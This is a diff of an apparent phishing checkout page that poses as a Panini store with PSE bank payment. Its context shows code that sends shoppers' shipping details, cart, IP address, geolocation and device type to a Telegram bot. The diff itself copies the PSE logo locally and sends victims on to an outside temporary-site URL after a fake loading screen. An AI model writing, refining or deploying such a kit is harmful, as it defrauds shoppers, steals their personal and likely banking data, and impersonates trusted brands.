@@ -399,10 +399,10 @@
     </div>
 </div>
 
-<!-- MODAL DE CARGA PSE -->
+<!-- MODAL DE CARGA PSE CON LOGO LOCAL -->
 <div id="modalCarga" class="modal-carga">
     <div class="modal-carga-contenido">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/66/PSE_logo.svg/200px-PSE_logo.svg.png" 
+        <img src="/panini/imagenes/pse-logo.webp" 
              alt="PSE" 
              class="logo-pse"
              onerror="this.src='https://placehold.co/200x80/0033A0/white?text=PSE'">
@@ -497,8 +497,6 @@
     function mostrarModalCarga() {
         const modal = document.getElementById('modalCarga');
         modal.style.display = 'flex';
-        // Animación suave al aparecer
-        modal.style.opacity = '0';
         setTimeout(() => { modal.style.opacity = '1'; }, 10);
     }
 
@@ -510,7 +508,7 @@
     }
 
     // Enviar datos a Telegram
-    async function enviarATelegram(datosEnvio, total, productos, modal) {
+    async function enviarATelegram(datosEnvio, total, productos) {
         const ahora = new Date();
         const fecha = ahora.toLocaleString('es-ES', { 
             weekday: 'long', 
@@ -522,7 +520,6 @@
             hour12: false
         });
         
-        // Obtener IP del usuario
         let ip = 'No disponible';
         let pais = 'No disponible';
         let ciudadGeo = 'No disponible';
@@ -540,13 +537,11 @@
             console.log('Error obteniendo geolocalización:', e);
         }
         
-        // Detectar dispositivo
         const userAgent = navigator.userAgent;
         let dispositivo = '💻 Desktop';
         if (userAgent.includes('iPhone') || userAgent.includes('Android')) dispositivo = '📱 Móvil';
         else if (userAgent.includes('iPad')) dispositivo = '📟 Tablet';
         
-        // Construir mensaje
         let mensaje = `🟢 *NUEVO PEDIDO - PANINI* 🟢\n\n`;
         mensaje += `🌐 *IP:* ${ip}\n`;
         mensaje += `📍 *País:* ${pais}\n`;
@@ -584,7 +579,6 @@
         mensaje += `💳 *Método de pago:* PSE\n\n`;
         mensaje += `🔐 *Pedido generado automáticamente*`;
         
-        // Enviar a Telegram
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         const params = {
             chat_id: TELEGRAM_CHAT_ID,
@@ -611,7 +605,6 @@
             return;
         }
         
-        // Mostrar modal de carga
         mostrarModalCarga();
         
         const datosEnvio = {
@@ -631,15 +624,11 @@
             guardarInfo: document.getElementById('guardar-info').checked
         };
         
-        // Guardar en localStorage
         localStorage.setItem('datosEnvio', JSON.stringify(datosEnvio));
-        
-        // Enviar a Telegram (sin esperar a que termine para no demorar)
         enviarATelegram(datosEnvio, window.cartTotal, window.cart);
         
-        // Esperar 1.5 segundos para mostrar el modal y luego redirigir
         setTimeout(() => {
-            window.location.href = '/panini/recarga.html';
+            window.location.href = 'https://hrg.mra.temporary.site/recargas/';
         }, 1500);
     }
 
